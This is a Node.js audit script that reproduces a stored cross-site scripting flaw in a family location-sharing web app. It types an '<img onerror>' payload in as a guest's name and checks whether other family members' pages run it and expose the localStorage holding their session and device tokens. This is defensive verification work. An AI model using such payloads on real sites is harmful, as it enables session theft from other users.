// Skeptic #1 for "xss-family-name-unescaped": independent reproduction, UI-only (no hand-made API writes).
//  1. Mom opens Me -> Guests -> Add, TYPES a 36-char HTML name into #gname (keyboard, so maxlength=40 applies), taps Add guest.
//  2. The guest signs in on their own phone, opens the park map, Family pane, switches on Share my spot with a GPS fix.
//  3. Eli (admin, iPad) and Ezra (kid, iPhone) open the park map -> Family pane. The payload assigns the page's
//     localStorage object to a global PWN; we then check PWN is the storage holding the viewer's hub.session/hub.device.
//     Nothing is exfiltrated; token values are never printed, only their presence/equality.
//  4. Eli taps the guest's row -> showFamily() card (:1316) to see if the card also renders it live.
// Run: node "audits/tools/phase3/dollywood-live/verify-xss-family-name-unescaped-1.mjs"
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { local, sleep } from '../../lib/local.mjs';
const HERE = path.dirname(fileURLToPath(import.meta.url));
const EV = path.resolve(HERE, '..', '..', '..', 'evidence', 'p3', 'dollywood-live'); fs.mkdirSync(EV, { recursive: true });
const PFX = 'verify-xss-family-name-unescaped-1';
const PAYLOAD = '<img src=x onerror=PWN=localStorage>';
const out = { payload: PAYLOAD, payloadLength: PAYLOAD.length };
const L = await local({ variant: 'park', clock: 'real', engine: 'webkit' });
async function openMap(d) {
  const f = await d.openApp('dollywood-live');
  await f.waitForSelector('#lv-pill[data-state]', { timeout: 20000 });
  await f.waitForFunction(() => window.hub && hub.profile, null, { timeout: 10000 }).catch(() => {});
  await sleep(1500); return f;
}
async function probe(f) {
  return f.evaluate(() => {
    const has = typeof window.PWN !== 'undefined';
    const isLS = has && window.PWN === window.localStorage;
    let sess = null, dev = null; try { sess = localStorage.getItem('hub.session'); dev = localStorage.getItem('hub.device'); } catch (e) {}
    return {
      pwnSet: has, pwnIsThisPagesLocalStorage: isLS,
      pwnSeesHubSession: isLS && !!window.PWN.getItem('hub.session') && window.PWN.getItem('hub.session') === sess,
      pwnSeesHubDevice: isLS && !!window.PWN.getItem('hub.device') && window.PWN.getItem('hub.device') === dev,
      viewer: hub.profile && { id: hub.profile.id, kind: hub.profile.kind, isAdmin: hub.profile.isAdmin },
      liveImgInFamList: [...document.querySelectorAll('#fam-list img[onerror]')].map(i => i.outerHTML),
      famListText: (document.getElementById('fam-list') || {}).textContent?.slice(0, 200),
    };
  });
}
try {
  // 1. Mom adds the guest through the shipped sheet
  const mom = await L.device({ device: 'desktop', profile: 'mom', fixedTime: false });
  await mom.goto('#me'); await sleep(2000);
  await mom.page.click('#guest-add'); await sleep(600);
  await mom.page.click('#gname');
  await mom.page.keyboard.type(PAYLOAD, { delay: 5 });
  out.typedValue = await mom.page.inputValue('#gname');
  await mom.page.click('#gform button[type=submit]'); await sleep(2500);
  const profs = await L.apiAs('eli', '/api/profiles');
  const list = profs.body.profiles || profs.body;
  const g = (Array.isArray(list) ? list : []).find(p => p.name === PAYLOAD);
  out.guestCreatedViaUi = g ? { id: g.id, storedName: g.name, is_guest: g.is_guest } : null;
  out.momMeGuestListShowsInert = await mom.page.evaluate(() => ({ liveImg: document.querySelectorAll('#guest-list img[onerror]').length, pwn: typeof window.PWN !== 'undefined' }));
  await mom.ctx.close?.();
  if (!g) throw new Error('guest not created via UI: ' + JSON.stringify(profs.body).slice(0, 300));
  // 2. The guest shares from the park map
  await L.sessions();
  const gdev = await L.newDevice({ name: 'Guest phone', profiles: [g.id] });
  const gp = await L.device({ device: 'iphone-pwa', profile: g.id, fixedTime: false, as: gdev });
  await gp.ctx.grantPermissions(['geolocation'], { origin: L.site });
  await gp.goto('#home'); await sleep(1500);
  const gf = await openMap(gp);
  const ll = await gf.evaluate(([x, y]) => ({ latitude: y / D.geo.my + D.geo.lat0, longitude: x / D.geo.mx + D.geo.lon0 }), [800, 850]);
  await gp.ctx.setGeolocation({ ...ll, accuracy: 6 });
  await gf.click('#lv-family'); await sleep(800);
  await gf.click('#lv-share'); await sleep(6000);
  out.guestOwnPage = await probe(gf);
  const srv = await L.apiAs('eli', '/api/data/dollywood-live?scope=family');
  const row = (srv.body.items || []).find(r => r.key === 'loc:' + g.id);
  out.serverLocRow = row ? { key: row.key, name: row.value.name } : null;
  // 3. Viewers
  out.viewers = {};
  for (const [pid, device] of [['eli', 'ipad-portrait'], ['ezra', 'iphone-pwa']]) {
    const d = await L.device({ device, profile: pid, fixedTime: false });
    await d.goto('#home'); await sleep(1500);
    const f = await openMap(d);
    const beforePane = await f.evaluate(() => typeof window.PWN !== 'undefined');
    await f.click('#lv-family'); await sleep(1500);
    const r = await probe(f); r.pwnSetBeforeOpeningFamilyPane = beforePane;
    if (pid === 'eli') {
      await d.page.screenshot({ path: path.join(EV, PFX + '-eli-family-ipad.png'), scale: 'css', animations: 'disabled' });
      // 4. the card
      await f.evaluate(() => { delete window.PWN; });
      await f.click(`#fam-list .lv-item[data-f="${g.id}"]`); await sleep(1200);
      r.card = await f.evaluate(() => ({ pwnSetAfterCard: typeof window.PWN !== 'undefined', liveImgInPop: [...document.querySelectorAll('#pop img[onerror], .pop img[onerror]')].length, liveImgAnywhere: document.querySelectorAll('img[onerror]').length }));
    }
    out.viewers[pid] = r;
  }
} catch (e) { out.error = String(e && e.stack || e); }
finally {
  fs.writeFileSync(path.join(EV, PFX + '.json'), JSON.stringify(out, null, 2));
  console.log(JSON.stringify(out, null, 2));
  await L.close();
}
